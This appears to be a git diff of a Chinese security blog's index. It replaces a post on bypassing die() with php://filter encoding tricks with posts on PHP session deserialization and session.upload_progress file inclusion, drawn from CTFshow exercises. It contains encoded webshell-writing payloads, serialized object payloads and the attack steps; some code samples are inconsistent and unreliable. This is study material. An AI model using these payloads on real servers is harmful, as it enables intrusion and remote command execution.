@@ -1135,47 +1135,91 @@
       </tags>
   </entry>
   <entry>
-    <title>利用php伪协议绕过die()</title>
-    <url>/2021/10/31/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die/</url>
-    <content><![CDATA[<p>file_put_content写入文件遇到exit() 、die() 情况分类</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$contnet</span>)</span><br><span class="line">file_put_contents(<span class="variable">$content</span>,<span class="string">&quot;&lt;?php die()&quot;</span>.<span class="variable">$contnet</span>);</span><br><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="variable">$contnet</span>.<span class="string">&#x27;\nxxxxxx&#x27;</span>);</span><br></pre></td></tr></table></figure>
+    <title>php代码审计学习-5</title>
+    <url>/2021/10/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5/</url>
+    <content><![CDATA[<h3 id="PHP-session反序列化"><a href="#PHP-session反序列化" class="headerlink" title="PHP session反序列化"></a>PHP session反序列化</h3><p>本文转自先知社区的panda师傅所写文章<a href="https://xz.aliyun.com/t/6640#toc-1">带你走进PHP session反序列化漏洞</a></p>
+<h4 id="PHP-Session的工作流程"><a href="#PHP-Session的工作流程" class="headerlink" title="PHP Session的工作流程"></a>PHP Session的工作流程</h4><p>当开始一个会话时，php会尝试在请求中查找<code>SessionID</code> （通常通过会话cookie），如果发现请求的Cookies，Get、Post中并不存在<code>session id</code>时，php便会自动调用<code>php_session_create_id</code>函数创建一个新的会话，并且通过http response的set-cookie头发送给客户端进行保存。</p>
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029103800930.png" alt="image-20211029103800930"></p>
+<p>当会话开始后，PHP便会将会话中的数据设置到<code>$_SESSION</code>变量中，下为在一个<code>$_SESSION</code>变量中注册变量的例子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;Nayon&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>此处我们可以利用php://filter协议，将文件内容中的die或exit解码掉，以便执行后方的其他语句。</p>
-<p><strong>文件名、内容皆可控</strong></p>
-<p><strong>base64编码绕过</strong></p>
-<p>利用base64编码解码，将exit die解码为乱码，将恶意代码解码还原。</p>
-<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031110309150.png" alt="image-20211031110309150"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure>
 
-<p><strong>2、rot13编码绕过</strong></p>
-<p>原理与base64解码绕过一致，将die解码为不可识别语句，但此方法需要服务器未开启短标签功能，若开启，就会被解析，后方的代码便会报错失去效果。</p>
-<p>本地环境报错。</p>
-<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031110649789.png" alt="image-20211031110649789"></p>
-<p><strong>过滤器编码套娃使用</strong></p>
-<p>利用过滤器嵌套过滤器，使得写入的内容层层解密，最后写入我们预期的代码。</p>
-<p><strong>strip_tags|base64-decode去除标签后解密base64</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?filename=php:<span class="comment">//filter/string.strip_tags|convert.base64-decode/resource=shell.php</span></span><br><span class="line">?contnet=<span class="meta">?&gt;</span>PD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>
+<p>当PHP脚本文件运行完成后，PHP会自动读取<code>$_SESSION</code>中的内容，并且将其序列化，然后发送给会话管理器来进行保存。</p>
+<p>默认情况中，PHP来使用内置的文件会话保存管理器来完成对<code>session</code>的保存，也可以通过配置项<code>session.save_header</code>来修改要采用的会话保存管理器。对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</p>
+<p>整个流程如上所属，也可参照下方流程图：</p>
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029104343511.png" alt="image-20211029104343511"></p>
+<p>​    </p>
+<p>php session存储默认是以文件方式进行存储，并且存储的文件是由<code>sess_sessionid</code>的格式进行存储的</p>
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029104605529.png" alt="image-20211029104605529"></p>
+<p>并且其中内容为session值序列化后的内容:</p>
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029104656890.png" alt="image-20211029104656890"></p>
+<p>session.serialize_header定义的引擎共有三种，如下表所示:</p>
+<table>
+<thead>
+<tr>
+<th>处理器名称</th>
+<th>存储格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php</td>
+<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_binary</td>
+<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_serialize</td>
+<td>经过serialize()函数序列化处理的<strong>数组</strong></td>
+</tr>
+</tbody></table>
+<h3 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h3><h4 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h4><p><code>session.serialize_header</code>默认省略使用php处理器</p>
+<p>demo1：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_header&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031112033989.png" alt="image-20211031112033989"></p>
-<p>但此方法在php7环境上会由于string.strip_tags的问题发生错误，从而导致无法写入shell，但在php5的环境下不会受此影响.</p>
-<p>测试demo ctfshow web入门87：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029105204806.png" alt="image-20211029105204806"></p>
+<p>序列化格式为:键名|由序列化处理后的值 : username|s:5:admin</p>
+<h4 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h4><p>当<code>int_set(&#39;session_serialize_header&#39;,&#39;php_binary&#39;)</code>时页面文件使用php_binary序列化格式存储session信息</p>
+<p>demo2:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sessionsessionsessionsessionsession&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>此处题目利用file_put_content写文件，并过滤了<code>php</code>、<code>data</code>等关键词，但由于存在urldecode函数，我们可以使用二次url编码绕过;内容处，于文件首写入die(),我们需要绕过die才可执行任意命令。</p>
-<p>利用<code>php://filter/writ=convert.base64-decode/resource=shell.php</code> 伪协议将即将写入的内容base64解码，将<code>&lt;?php die(xxx);?&gt;</code>解码为无意义的乱码，使得php无法识别，再将base64编码后的<code>&lt;?php system($_POST[&#39;cmd&#39;]);?&gt;</code>写入以便执行系统命令。</p>
-<p>需要注意的是，由于base64_decode识别机制类似于下方代码，只会识别64个可打印字符</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = preg_replace(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line">base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029110308380.png" alt="image-20211029110308380"></p>
+<p>此处键值长度为35,35对应的ASCII码为<code>#</code>，因此最终的结果便成了ascii吗将内容注释为空</p>
+<h4 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h4><p>当<code>ini_set(&#39;session.serialize_header&#39;,&#39;php_serialize&#39;)</code>时</p>
+<p>demo:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>而在<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>中，base64_decode会将其他字符略去，只对<code>php die</code>进行解码操作,同时，base64编码4位一组，需在恶意代码前添加两个字符用于解码，用于避免恶意代码解码错误。</p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%37%33%25%36%38%25%36%35%25%36%43%25%36%43%25%32%45%25%37%30%25%36%38%25%37%30</span><br><span class="line"></span><br><span class="line">POST:content=aaPD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029111810927.png" alt="image-20211029111810927"></p>
+<p>序列化后a:1表示$_session数组中存在一个元素，{}中为其参数名与值</p>
+<h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p>利用<code>ryat</code>师傅提出的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action =“ upload.php” method =“ POST” enctype =“ multipart / form-data”&gt;</span><br><span class="line">    &lt;input type =“ hidden” name =“ PHP_SESSION_UPLOAD_PROGRESS” value =“ ryat” /&gt;</span><br><span class="line">    &lt;input type =“ file” name =“ file” /&gt;</span><br><span class="line">    &lt;input type =“ submit” /&gt;</span><br><span class="line">&lt;/ form&gt;</span><br></pre></td></tr></table></figure>
 
+<p>提交后，<code>$_SESSION</code>中的键值就会为$_SESSION[‘upload_progress_ryat’] 在会话上传过程中，将会话数据进行序列化/反序列化，序列化格式会由<code>php.ini</code>中的<code>session.serialize_hander</code>选项设置，由此可知，若在脚本文件中设置不同的serialize_handler，那么可以导致注入任意<code>session</code>数据。</p>
+<p>上面的解释可能看起来有些绕，简单来说<code>php</code>处理器和<code>php_serialize</code>处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。</p>
+<p>其威海店在于<code>session.serialize_handler=php_serialize</code>存储的字符可以引入| ,但当以<code>session.serialize_handler=php</code>格式取出<code>$_session</code>值时,<code>|</code>会被当做键值对的分隔符，造成键、值数目错误，会在特定的地方造成反序列化漏洞</p>
+<p>demo：</p>
+<p>利用session.php文件，用于传入session值，文件内容如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<p>其session内容如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;session&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031105448496.png" alt="image-20211031105448496"></p>
-<p>参考文章:</p>
-<p><a href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a></p>
-<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p>其另一个class.php文件如下:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">  ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">  session_start();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Class1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Who are you?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$str</span> = <span class="keyword">new</span> test();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此处运行实例化后，输出test</p>
+<p><code>session.php</code> 文件的处理器是<code>php_serialize</code>，<code>class.php</code>文件的处理器是<code>php</code>，<code>session.php</code>文件的作用是传入可控的session值，class.php文件的作用是在对象unserialize()之前进行调用输出<code>who are you</code>，反序列化结束后，输出name值</p>
+<p>这两个文件想要利用反序列化session漏洞，我们需要在session.php文件传入<code>|</code>与<code>序列化格式的值</code>，然后再次访问class.php时，就会调用session值，以php处理器的格式取出session，从而引发反序列化漏洞。</p>
+<p>首先生成序列化字符串</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="comment">//触发反序列化时，调用__wakeup()打印输出字符串</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;who are you&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//对象运行完成，打印name值</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="keyword">$this</span>-&gt;<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//新建实例str</span></span><br><span class="line"><span class="variable">$str</span> = <span class="keyword">new</span> Class2();</span><br><span class="line"><span class="comment">//对实例name赋值</span></span><br><span class="line"><span class="variable">$str</span>-&gt;name=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="comment">//序列化对象</span></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>
+
+<p>拿到payload:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Class1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029123051359.png" alt="image-20211029123051359"></p>
+<p>将其传入index.php</p>
 ]]></content>
       <categories>
         <category>代码审计</category>
@@ -1273,97 +1317,43 @@
       </tags>
   </entry>
   <entry>
-    <title>php代码审计学习-5</title>
-    <url>/2021/10/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5/</url>
-    <content><![CDATA[<h3 id="PHP-session反序列化"><a href="#PHP-session反序列化" class="headerlink" title="PHP session反序列化"></a>PHP session反序列化</h3><p>本文转自先知社区的panda师傅所写文章<a href="https://xz.aliyun.com/t/6640#toc-1">带你走进PHP session反序列化漏洞</a></p>
-<h4 id="PHP-Session的工作流程"><a href="#PHP-Session的工作流程" class="headerlink" title="PHP Session的工作流程"></a>PHP Session的工作流程</h4><p>当开始一个会话时，php会尝试在请求中查找<code>SessionID</code> （通常通过会话cookie），如果发现请求的Cookies，Get、Post中并不存在<code>session id</code>时，php便会自动调用<code>php_session_create_id</code>函数创建一个新的会话，并且通过http response的set-cookie头发送给客户端进行保存。</p>
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029103800930.png" alt="image-20211029103800930"></p>
-<p>当会话开始后，PHP便会将会话中的数据设置到<code>$_SESSION</code>变量中，下为在一个<code>$_SESSION</code>变量中注册变量的例子</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;Nayon&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    <title>利用session.upload_progress进行文件包含</title>
+    <url>/2021/10/30/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h3 id="Session-上传进度"><a href="#Session-上传进度" class="headerlink" title="Session 上传进度"></a>Session 上传进度</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">此特性自PHP <span class="number">5.4</span>.<span class="number">0</span>后启用</span><br></pre></td></tr></table></figure>
 
+<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030211326157.png" alt="image-20211030211326157"></p>
+<p>我们可以利用<code>session.upload_progress</code> 将木马写入session文件，然后包含这个文件。但是首先我们需要知道session文件将会保存在何处</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在Linux php中 session文件默认保存在/tmp/sess_session名中</span><br></pre></td></tr></table></figure>
+
+<p>以及会如何保存</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure>
 
-<p>当PHP脚本文件运行完成后，PHP会自动读取<code>$_SESSION</code>中的内容，并且将其序列化，然后发送给会话管理器来进行保存。</p>
-<p>默认情况中，PHP来使用内置的文件会话保存管理器来完成对<code>session</code>的保存，也可以通过配置项<code>session.save_header</code>来修改要采用的会话保存管理器。对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</p>
-<p>整个流程如上所属，也可参照下方流程图：</p>
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029104343511.png" alt="image-20211029104343511"></p>
-<p>​    </p>
-<p>php session存储默认是以文件方式进行存储，并且存储的文件是由<code>sess_sessionid</code>的格式进行存储的</p>
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029104605529.png" alt="image-20211029104605529"></p>
-<p>并且其中内容为session值序列化后的内容:</p>
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029104656890.png" alt="image-20211029104656890"></p>
-<p>session.serialize_header定义的引擎共有三种，如下表所示:</p>
-<table>
-<thead>
-<tr>
-<th>处理器名称</th>
-<th>存储格式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>php</td>
-<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
-</tr>
-<tr>
-<td>php_binary</td>
-<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
-</tr>
-<tr>
-<td>php_serialize</td>
-<td>经过serialize()函数序列化处理的<strong>数组</strong></td>
-</tr>
-</tbody></table>
-<h3 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h3><h4 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h4><p><code>session.serialize_header</code>默认省略使用php处理器</p>
-<p>demo1：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_header&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030212042701.png" alt="image-20211030212042701"></p>
+<p>默认<code>session.use_strict_mode</code>为off状态，也就是说，用户可以在浏览器或者Burpsuit中自定义session ID值用于指明sess文件名。</p>
+<p>但是<code>session.upload_progress.cleanup</code>值为默认开启状态</p>
+<p>当<code>session.upload_progress.cleanup</code>默认开启时，一旦读取了所有的POST数据，便会清除session文件。</p>
+<p>此处我们可以利用条件竞争的方式进行利用文件上传，生成sess文件，趁着sess文件还未删除，进行包含利用。</p>
+<p>CTFshow web入门 web82                     </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 19:34:45</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029105204806.png" alt="image-20211029105204806"></p>
-<p>序列化格式为:键名|由序列化处理后的值 : username|s:5:admin</p>
-<h4 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h4><p>当<code>int_set(&#39;session_serialize_header&#39;,&#39;php_binary&#39;)</code>时页面文件使用php_binary序列化格式存储session信息</p>
-<p>demo2:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sessionsessionsessionsessionsession&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此处可以看出，题目排除了<code>php://</code>、<code>data://</code>、<code>日志包含</code>的手法进行getshell，此处尝试利用<code>PHP_UPLOAD_PROGRESS</code>进行getshell</p>
+<p>此处利用<code>php.net</code>提供的上传栏代码加以修改:</p>
